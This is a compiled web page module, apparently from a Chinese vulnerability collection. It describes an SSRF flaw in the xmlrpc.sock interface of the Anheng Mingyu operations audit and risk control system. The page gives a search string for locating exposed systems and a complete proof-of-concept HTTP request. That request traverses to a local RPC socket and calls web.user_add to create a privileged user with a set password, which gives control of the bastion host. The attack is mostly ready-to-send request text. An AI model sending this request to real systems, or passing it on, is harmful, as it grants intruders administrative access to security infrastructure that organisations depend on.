import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as i,e as l}from"./app-58e4a7d6.js";const t={},a=l(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>安恒 明御运维审计与风险控制系统 xmlrpc.sock 接口存在SSRF漏洞，通过漏洞可以添加任意用户控制堡垒机</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>安恒 明御运维审计与风险控制系统</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;明御运维审计与风险控制系统&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828163144773.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
Host: 
Cookie: LANG=zh; DBAPPUSM=ee4bbf6c85e541bb980ad4e0fbee2f57bb15bafe20a7028af9a0b8901cf80fd3
Content-Length: 1117
Cache-Control: max-age=0
Sec-Ch-Ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;100&quot;, &quot;Google Chrome&quot;;v=&quot;100&quot;
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: &quot;Windows&quot;
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

&lt;?xml version=&quot;1.0&quot;?&gt;  
&lt;methodCall&gt;
&lt;methodName&gt;web.user_add&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;
&lt;value&gt;
&lt;array&gt;
&lt;data&gt;
&lt;value&gt;
&lt;string&gt;admin&lt;/string&gt;
&lt;/value&gt;
&lt;value&gt;
&lt;string&gt;5&lt;/string&gt;
&lt;/value&gt;
&lt;value&gt;
&lt;string&gt;10.0.0.1&lt;/string&gt;
&lt;/value&gt;
&lt;/data&gt;
&lt;/array&gt;
&lt;/value&gt;
&lt;/param&gt;
&lt;param&gt;
&lt;value&gt;
&lt;struct&gt;
&lt;member&gt;
&lt;name&gt;uname&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;test&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;name&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;test&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;pwd&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;1qaz@3edC12345&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;authmode&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;1&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;deptid&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;email&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;mobile&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;comment&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;roleid&lt;/name&gt;
&lt;value&gt;
&lt;string&gt;102&lt;/string&gt;
&lt;/value&gt;
&lt;/member&gt;
&lt;/struct&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828163201512.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12),s=[a];function d(v,r){return n(),i("div",null,s)}const u=e(t,[["render",d],["__file","安恒 明御运维审计与风险控制系统 xmlrpc.sock 任意用户添加漏洞.html.vue"]]);export{u as default};
